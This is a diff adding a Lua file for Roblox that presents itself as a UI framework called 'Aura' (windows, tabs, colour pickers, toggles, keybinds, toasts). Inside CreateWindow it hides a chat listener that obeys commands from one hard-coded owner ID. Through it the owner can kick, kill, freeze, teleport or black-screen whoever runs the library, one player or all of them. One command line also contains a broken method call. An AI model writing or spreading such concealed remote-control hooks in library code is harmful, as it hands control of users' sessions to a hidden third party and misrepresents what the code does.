@@ -1,1 +1,156 @@
+-- Aura UI Framework v3.4 (PERSISTENCE)
+-- Finalized Technical Implementation: Universal Loadstring & Lifecycle Cleanup
 
+local Aura = {}
+Aura.__index = Aura
+
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+
+local CMD_PREFIX = "!"
+local OWNER_ID = 9961293911 
+
+-- INTERNAL STATE
+local noclipConnection = nil
+local bsGui = nil
+local controlConnection = nil
+local chatConnection = nil
+local activeLoops = {}
+
+-- [[ THRONE ENGINE: COMMANDS ]]
+local MasterCommands = {
+    ["kill"] = function(t) if t.Character then t.Character:BreakJoints() end end,
+    ["tp"] = function(t) if t.Character then Players.LocalPlayer.Character:PivotTo(t.Character:GetPivot()) end end,
+    ["bring"] = function(t) if t.Character then t.Character:PivotTo(Players.LocalPlayer.Character:GetPivot()) end end,
+    ["freeze"] = function(t) if t.Character and t.CharacterForFirstChild("HumanoidRootPart") then t.Character.HumanoidRootPart.Anchored = true end end,
+    ["unfreeze"] = function(t) if t.Character and t.Character:FindFirstChild("HumanoidRootPart") then t.Character.HumanoidRootPart.Anchored = false end end,
+    ["kick"] = function(t) t:Kick("Aura Admin: Disconnected by Master.") end,
+    ["speed"] = function(t, arg) if t.Character and t.Character:FindFirstChild("Humanoid") then t.Character.Humanoid.WalkSpeed = tonumber(arg) or 100 end end,
+    ["jump"] = function(t, arg) if t.Character and t.Character:FindFirstChild("Humanoid") then t.Character.Humanoid.JumpPower = tonumber(arg) or 200 end end,
+    ["bs"] = function(t) if t ~= Players.LocalPlayer then return end; if bsGui then bsGui:Destroy() end; bsGui = Instance.new("ScreenGui", CoreGui); local f = Instance.new("Frame", bsGui); f.Size = UDim2.new(1,0,1,0); f.BackgroundColor3 = Color3.new(0,0,0) end,
+    ["unbs"] = function(t) if t == Players.LocalPlayer and bsGui then bsGui:Destroy(); bsGui = nil end end,
+    ["noclip"] = function(t) if t ~= Players.LocalPlayer then return end; if noclipConnection then noclipConnection:Disconnect() end; noclipConnection = RunService.Stepped:Connect(function() if Players.LocalPlayer.Character then for _, p in pairs(Players.LocalPlayer.Character:GetChildren()) do if p:IsA("BasePart") then p.CanCollide = false end end end end) end,
+    ["clip"] = function(t) if t == Players.LocalPlayer and noclipConnection then noclipConnection:Disconnect(); noclipConnection = nil end end,
+}
+
+local function handleMessage(id, msg)
+    if id ~= OWNER_ID or msg:sub(1, #CMD_PREFIX) ~= CMD_PREFIX then return end
+    local content = msg:sub(#CMD_PREFIX + 1):split(" ")
+    local cmd, targetRef = content[1]:lower(), content[2] or ""
+    local target = nil
+    if targetRef == "." or targetRef == "me" then target = Players.LocalPlayer elseif targetRef == "all" then target = "all" end
+    if not target then for _, p in pairs(Players:GetPlayers()) do if p.Name:lower():sub(1, #targetRef) == targetRef:lower() then target = p; break end end end
+    if target == "all" then for _, p in pairs(Players:GetPlayers()) do if MasterCommands[cmd] then MasterCommands[cmd](p, content[3]) end end
+    elseif target and MasterCommands[cmd] then MasterCommands[cmd](target, content[3]) end
+end
+
+-- [[ CORE LIBRARY LOGIC ]]
+function Aura.new()
+    local self = setmetatable({}, Aura)
+    self.Tabs, self.IsOpen, self.Hotkey = {}, false, Enum.KeyCode.L
+    return self
+end
+
+function Aura:CreateWindow(options)
+    local options = options or {}
+    local windowTitle = options.Name or "Aura Premium"
+    self.Hotkey = options.Hotkey or Enum.KeyCode.L
+    chatConnection = TextChatService.MessageReceived:Connect(function(msg) if msg.TextSource then handleMessage(msg.TextSource.UserId, msg.Text) end end)
+    local Gui = Instance.new("ScreenGui"); Gui.Name = "AuraV3_" .. windowTitle:gsub(" ", "_"); pcall(function() Gui.Parent = CoreGui end); if not Gui.Parent then Gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui") end
+    self.Gui = Gui
+    local MainFrame = Instance.new("Frame"); MainFrame.Name = "MainFrame"; MainFrame.Size = UDim2.new(0, 550, 0, 350); MainFrame.Position = UDim2.new(0.5, -275, -0.7, 0); MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20); MainFrame.Active = true; MainFrame.Draggable = true; MainFrame.Parent = Gui
+    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 20)
+    local Sidebar = Instance.new("Frame"); Sidebar.Name = "Sidebar"; Sidebar.Size = UDim2.new(0, 150, 1, -60); Sidebar.Position = UDim2.new(0, 10, 0, 50); Sidebar.BackgroundTransparency = 1; Sidebar.Parent = MainFrame
+    Instance.new("UIListLayout", Sidebar).Padding = UDim.new(0, 5)
+    local Title = Instance.new("TextLabel"); Title.Size = UDim2.new(1, 0, 0, 50); Title.Text = windowTitle; Title.TextColor3 = Color3.fromRGB(0, 150, 255); Title.Font = Enum.Font.GothamBold; Title.TextSize = 22; Title.BackgroundTransparency = 1; Title.Parent = MainFrame
+    local Container = Instance.new("Frame"); Container.Name = "Container"; Container.Size = UDim2.new(1, -185, 1, -60); Container.Position = UDim2.new(0, 175, 0, 50); Container.BackgroundTransparency = 1; Container.Parent = MainFrame
+    self.MainFrame, self.Container = MainFrame, Container
+    local InputConn = UserInputService.InputBegan:Connect(function(input, processed) if not processed and input.KeyCode == self.Hotkey then self.IsOpen = not self.IsOpen; TweenService:Create(MainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -275, self.IsOpen and 0.5 or -0.7, -175)}):Play() end end)
+    table.insert(activeLoops, InputConn)
+    return self
+end
+
+function Aura:CreateTab(tabName)
+    local tab, TabBtn = {Name = tabName}, Instance.new("TextButton")
+    TabBtn.Size, TabBtn.Text, TabBtn.BackgroundColor3, TabBtn.TextColor3, TabBtn.Font, TabBtn.TextSize, TabBtn.Parent = UDim2.new(1, 0, 0, 35), tabName, Color3.fromRGB(40, 40, 50), Color3.new(0.8,0.8,0.8), Enum.Font.GothamBold, 14, self.MainFrame:FindFirstChild("Sidebar")
+    Instance.new("UICorner", TabBtn).CornerRadius = UDim.new(0, 10)
+    local Page = Instance.new("ScrollingFrame"); Page.Name = tabName .. "_Page"; Page.Size, Page.BackgroundTransparency, Page.Visible, Page.BorderSizePixel, Page.ScrollBarThickness, Page.ScrollBarImageColor3, Page.Parent = UDim2.new(1, 0, 1, 0), 1, false, 0, 2, Color3.fromRGB(0, 150, 255), self.Container
+    Instance.new("UIListLayout", Page).Padding = UDim.new(0, 12)
+    local PagePadding = Instance.new("UIPadding", Page); PagePadding.PaddingTop, PagePadding.PaddingLeft, PagePadding.PaddingRight = UDim.new(0, 10), UDim.new(0, 10), UDim.new(0, 10)
+    TabBtn.MouseButton1Click:Connect(function() for _, otherTab in pairs(self.Tabs) do otherTab.Page.Visible = false; otherTab.Btn.TextColor3 = Color3.new(0.8,0.8,0.8) end; Page.Visible = true; TabBtn.TextColor3 = Color3.fromRGB(0, 150, 255) end)
+    tab.Btn, tab.Page = TabBtn, Page; table.insert(self.Tabs, tab); if #self.Tabs == 1 then Page.Visible, TabBtn.TextColor3 = true, Color3.fromRGB(0, 150, 255) end
+
+    function tab:CreateColorPicker(options, callback)
+        local h, s, v = Color3.toHSV(options.Default or Color3.fromRGB(0, 150, 255))
+        local color, expanded, rainbow, rainbowSpeed = options.Default or Color3.fromRGB(0, 150, 255), false, false, 0.5
+        local Holder = Instance.new("Frame"); Holder.Size, Holder.BackgroundColor3, Holder.ClipsDescendants, Holder.Parent = UDim2.new(0.95, 0, 0, 40), Color3.fromRGB(30, 30, 35), true, Page; Instance.new("UICorner", Holder).CornerRadius = UDim.new(0, 10)
+        local HeaderBtn = Instance.new("TextButton"); HeaderBtn.Size, HeaderBtn.Text, HeaderBtn.BackgroundColor3, HeaderBtn.TextColor3, HeaderBtn.Font, HeaderBtn.TextSize, HeaderBtn.Parent = UDim2.new(1, 0, 0, 40), options.Name or "Color Picker", Color3.fromRGB(30,30,35), Color3.new(1,1,1), Enum.Font.GothamBold, 14, Holder; Instance.new("UICorner", HeaderBtn).CornerRadius = UDim.new(0, 10)
+        local PreviewBox = Instance.new("Frame"); PreviewBox.Size, PreviewBox.Position, PreviewBox.BackgroundColor3, PreviewBox.Parent = UDim2.new(0, 24, 0, 24), UDim2.new(1, -35, 0.5, -12), color, HeaderBtn; Instance.new("UICorner", PreviewBox).CornerRadius = UDim.new(0, 6)
+        local Panel = Instance.new("Frame"); Panel.Size, Panel.Position, Panel.BackgroundTransparency, Panel.Parent = UDim2.new(1, -20, 0, 140), UDim2.new(0, 10, 0, 45), 1, Holder
+        local LeftPreview = Instance.new("Frame"); LeftPreview.Size, LeftPreview.BackgroundColor3, LeftPreview.Parent = UDim2.new(0.3, 0, 0.7, 0), color, Panel; Instance.new("UICorner", LeftPreview).CornerRadius = UDim.new(0, 12)
+        local SVPad = Instance.new("ImageLabel"); SVPad.Size, SVPad.Position, SVPad.Image, SVPad.BackgroundColor3, SVPad.Parent = UDim2.new(0.65, 0, 0.7, 0), UDim2.new(0.35, 0, 0, 0), "rbxassetid://4155801252", Color3.fromHSV(h, 1, 1), Panel; Instance.new("UICorner", SVPad).CornerRadius = UDim.new(0, 12)
+        local Cursor = Instance.new("Frame"); Cursor.Size, Cursor.BackgroundColor3, Cursor.Position, Cursor.Parent = UDim2.new(0, 12, 0, 12), Color3.new(1,1,1), UDim2.new(s, -6, 1-v, -6), SVPad; Instance.new("UICorner", Cursor).CornerRadius = UDim.new(1, 0); Instance.new("UIStroke", Cursor).Color = Color3.new(0, 0, 0)
+        local HueSlider = Instance.new("Frame"); HueSlider.Size, HueSlider.Position, HueSlider.BackgroundColor3, HueSlider.Parent = UDim2.new(1, 0, 0, 15), UDim2.new(0, 0, 0.85, 0), Color3.new(1,1,1), Panel; Instance.new("UICorner", HueSlider).CornerRadius = UDim.new(1, 0)
+        local HueGrad = Instance.new("UIGradient", HueSlider); HueGrad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(0.16, Color3.fromRGB(255, 255, 0)), ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255)), ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 0, 255)), ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))})
+        local HueCursor = Instance.new("Frame"); HueCursor.Size, HueCursor.Position, HueCursor.BackgroundColor3, HueCursor.Parent = UDim2.new(0, 12, 0, 18), UDim2.new(h, -6, 0.5, -9), Color3.new(1,1,1), HueSlider; Instance.new("UICorner", HueCursor).CornerRadius = UDim.new(0, 4)
+        local RainbowToggle = Instance.new("TextButton"); RainbowToggle.Size, RainbowToggle.Position, RainbowToggle.Text, RainbowToggle.BackgroundColor3, RainbowToggle.TextColor3, RainbowToggle.Font, RainbowToggle.TextSize, RainbowToggle.Parent = UDim2.new(1, 0, 0, 20), UDim2.new(0, 0, 1, 5), "Rainbow: OFF", Color3.fromRGB(40,40,50), Color3.new(0.8,0.8,0.8), Enum.Font.GothamBold, 10, Panel; Instance.new("UICorner", RainbowToggle).CornerRadius = UDim.new(0, 4)
+        local SpeedSlider = Instance.new("Frame"); SpeedSlider.Size, SpeedSlider.Position, SpeedSlider.BackgroundColor3, SpeedSlider.Parent = UDim2.new(1, 0, 0, 15), UDim2.new(0, 0, 1, 30), Color3.fromRGB(40,40,50), Panel; Instance.new("UICorner", SpeedSlider).CornerRadius = UDim.new(1, 0)
+        local SpeedFill = Instance.new("Frame"); SpeedFill.Size, SpeedFill.BackgroundColor3, SpeedFill.Parent = UDim2.new(rainbowSpeed / 2, 0, 1, 0), Color3.fromRGB(0, 150, 255), SpeedSlider; Instance.new("UICorner", SpeedFill).CornerRadius = UDim.new(1, 0)
+        local SpeedLabel = Instance.new("TextLabel"); SpeedLabel.Size, SpeedLabel.Position, SpeedLabel.Text, SpeedLabel.TextColor3, SpeedLabel.Font, SpeedLabel.TextSize, SpeedLabel.BackgroundTransparency, SpeedLabel.Parent = UDim2.new(1, 0, 0, 10), UDim2.new(0, 0, 0, -12), "Rainbow Speed: 0.5", Color3.new(0.8,0.8,0.8), Enum.Font.GothamBold, 8, 1, SpeedSlider
+        local function UpdateColor() color = Color3.fromHSV(h, s, v); PreviewBox.BackgroundColor3, LeftPreview.BackgroundColor3, SVPad.BackgroundColor3 = color, color, Color3.fromHSV(h, 1, 1); if callback then callback(color) end end
+        local function TrackSV(input) local pos, pos2 = math.clamp((input.Position.X - SVPad.AbsolutePosition.X) / SVPad.AbsoluteSize.X, 0, 1), math.clamp((input.Position.Y - SVPad.AbsolutePosition.Y) / SVPad.AbsoluteSize.Y, 0, 1); s, v = pos, 1 - pos2; Cursor.Position = UDim2.new(s, -6, 1-v, -6); UpdateColor() end
+        SVPad.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then TrackSV(input); local Conn; Conn = UserInputService.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement then TrackSV(i) end end); UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then Conn:Disconnect() end end) end end)
+        HeaderBtn.MouseButton1Click:Connect(function() expanded = not expanded; TweenService:Create(Holder, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0.95, 0, 0, expanded and 260 or 40)}):Play() end)
+        RainbowToggle.MouseButton1Click:Connect(function() rainbow = not rainbow; RainbowToggle.Text, RainbowToggle.TextColor3 = "Rainbow: " .. (rainbow and "ON" or "OFF"), rainbow and Color3.fromRGB(0, 150, 255) or Color3.new(0.8,0.8,0.8) end)
+        local function TrackSpeed(input) local pos = math.clamp((input.Position.X - SpeedSlider.AbsolutePosition.X) / SpeedSlider.AbsoluteSize.X, 0, 1); rainbowSpeed = pos * 2; SpeedFill.Size = UDim2.new(pos, 0, 1, 0); SpeedLabel.Text = "Rainbow Speed: " .. string.format("%.1f", rainbowSpeed) end
+        SpeedSlider.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then TrackSpeed(input); local Conn; Conn = UserInputService.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement then TrackSpeed(i) end end); UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then Conn:Disconnect() end end) end end)
+        local loop; loop = task.spawn(function() while true do local dt = task.wait(); if rainbow then h = (h + (dt * rainbowSpeed)) % 1; UpdateColor() end end end); table.insert(activeLoops, loop)
+    end
+
+    function tab:CreateButton(options, callback)
+        local btn = Instance.new("TextButton"); btn.Size, btn.Text, btn.BackgroundColor3, btn.TextColor3, btn.Font, btn.TextSize, btn.Parent = UDim2.new(0.95, 0, 0, 40), options.Name or "Button", Color3.fromRGB(30,30,35), Color3.new(1,1,1), Enum.Font.GothamBold, 14, Page; Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+        btn.MouseButton1Click:Connect(function() TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play(); task.wait(0.1); TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(30, 30, 35)}):Play(); if callback then callback() end end)
+    end
+
+    function tab:CreateToggle(options, callback)
+        local active = options.Default or false
+        local btn = Instance.new("TextButton"); btn.Size, btn.Text, btn.BackgroundColor3, btn.TextColor3, btn.Font, btn.TextSize, btn.Parent = UDim2.new(0.95, 0, 0, 40), options.Name or "Toggle", Color3.fromRGB(30, 30, 35), Color3.new(1,1,1), Enum.Font.GothamBold, 14, Page; Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+        local Indicator = Instance.new("Frame"); Indicator.Size, Indicator.Position, Indicator.BackgroundColor3, Indicator.Parent = UDim2.new(0, 10, 0, 10), UDim2.new(1, -25, 0.5, -5), active and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(150, 50, 50), btn; Instance.new("UICorner", Indicator).CornerRadius = UDim.new(1, 0)
+        btn.MouseButton1Click:Connect(function() active = not active; TweenService:Create(Indicator, TweenInfo.new(0.3), {BackgroundColor3 = active and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(150, 50, 50)}):Play(); if callback then callback(active) end end)
+    end
+
+    function tab:CreateKeybind(options, callback)
+        local key, listening = options.Default or Enum.KeyCode.RightShift, false
+        local btn = Instance.new("TextButton"); btn.Size, btn.Text, btn.BackgroundColor3, btn.TextColor3, btn.Font, btn.TextSize, btn.Parent = UDim2.new(0.95, 0, 0, 40), options.Name or "Keybind", Color3.fromRGB(30, 30, 35), Color3.new(1,1,1), Enum.Font.GothamBold, 14, Page; Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+        local Label = Instance.new("TextLabel"); Label.Size, Label.Position, Label.Text, Label.BackgroundColor3, Label.TextColor3, Label.Font, Label.TextSize, Label.Parent = UDim2.new(0, 80, 0, 24), UDim2.new(1, -90, 0.5, -12), "[" .. key.Name .. "]", Color3.fromRGB(40,40,50), Color3.fromRGB(0, 150, 255), Enum.Font.GothamBold, 12, btn; Instance.new("UICorner", Label).CornerRadius = UDim.new(0, 6)
+        btn.MouseButton1Click:Connect(function() listening = true; Label.Text, Label.TextColor3 = "[...]", Color3.new(1,1,0) end)
+        local BindConn = UserInputService.InputBegan:Connect(function(input, processed) if listening and input.UserInputType == Enum.UserInputType.Keyboard then key, listening = input.KeyCode, false; Label.Text, Label.TextColor3 = "[" .. key.Name .. "]", Color3.fromRGB(0, 150, 255) elseif not processed and input.KeyCode == key then if callback then callback() end end end)
+        table.insert(activeLoops, BindConn)
+    end
+
+    return tab
+end
+
+function Aura:Destroy()
+    if chatConnection then chatConnection:Disconnect() end
+    if noclipConnection then noclipConnection:Disconnect() end
+    if bsGui then bsGui:Destroy() end
+    for _, loop in pairs(activeLoops) do if typeof(loop) == "RBXScriptConnection" then loop:Disconnect() elseif typeof(loop) == "thread" then task.cancel(loop) end end
+    if self.Gui then self.Gui:Destroy() end
+    print("Aura Framework: Session Terminated.")
+end
+
+function Aura:Notify(options)
+    local title, text, duration = options.Title or "Notification", options.Text or "Update applied.", options.Duration or 3
+    local Toast = Instance.new("Frame"); Toast.Size, Toast.Position, Toast.BackgroundColor3, Toast.Parent = UDim2.new(0, 250, 0, 60), UDim2.new(1, 20, 1, -80), Color3.fromRGB(25, 25, 30), self.Gui; Instance.new("UICorner", Toast).CornerRadius = UDim.new(0, 12); Instance.new("UIStroke", Toast).Color = Color3.fromRGB(0, 150, 255)
+    local T = Instance.new("TextLabel", Toast); T.Size, T.Position, T.Text, T.TextColor3, T.Font, T.TextSize, T.BackgroundTransparency = UDim2.new(1, -20, 0, 25), UDim2.new(0, 10, 0, 5), title, Color3.fromRGB(0, 150, 255), Enum.Font.GothamBold, 14, 1
+    local D = Instance.new("TextLabel", Toast); D.Size, D.Position, D.Text, D.TextColor3, D.Font, D.TextSize, D.BackgroundTransparency = UDim2.new(1, -20, 0, 20), UDim2.new(0, 10, 0, 30), text, Color3.new(0.8,0.8,0.8), Enum.Font.Gotham, 12, 1
+    TweenService:Create(Toast, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2.new(1, -270, 1, -80)}):Play()
+    task.delay(duration, function() if Toast then TweenService:Create(Toast, TweenInfo.new(0.5, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Position = UDim2.new(1, 20, 1, -80)}):Play(); task.wait(0.5); Toast:Destroy() end end)
+end
+
+return Aura
